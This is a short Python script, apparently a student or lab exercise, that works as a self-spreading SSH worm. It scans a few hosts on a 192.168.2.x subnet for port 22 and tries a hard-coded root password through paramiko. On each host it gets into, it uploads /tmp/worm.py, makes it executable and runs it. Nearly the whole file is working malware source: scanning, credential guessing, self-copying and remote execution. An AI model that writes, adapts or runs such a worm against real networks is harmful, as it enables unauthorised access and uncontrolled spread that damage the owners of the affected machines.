import paramiko
import sys
import socket
import os

target = '192.168.2.'
port = 22
DICTIONARY = {'root': 'toor'}

def scan():
    hosts = []
    for i in range(1,5):
        try:
            test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test.settimeout(0.1)
            test.connect((target + str(i), 22))
            hosts.append(target + str(i))
            test.close()
        except:
            test.close()

    return hosts

def attack(hostIP):
    for username in DICTIONARY.keys():
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostIP, username = username, password = DICTIONARY[username])
            return ssh
        except:
            print('wrong userName and password')
    print('Login failed')
    return False

def uploadAndExecute(ssh):
    sftpClient = ssh.open_sftp()
    sftpClient.put("/tmp/worm.py","/tmp/worm.py")
    ssh.exec_command("chmod a+x /tmp/worm.py")
    # ssh.exec_command("nohup python -u /tmp/worm.py > /tmp/worm.output &")
    ssh.exec_command("python /tmp/worm.py")

hosts = scan()
ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip.connect(("8.8.8.8", 80))
ipAddress = ip.getsockname()[0]
ip.close()
for hostIP in hosts:
    if ipAddress != hostIP:
        ssh = attack(hostIP)
        if ssh:
            uploadAndExecute(ssh)
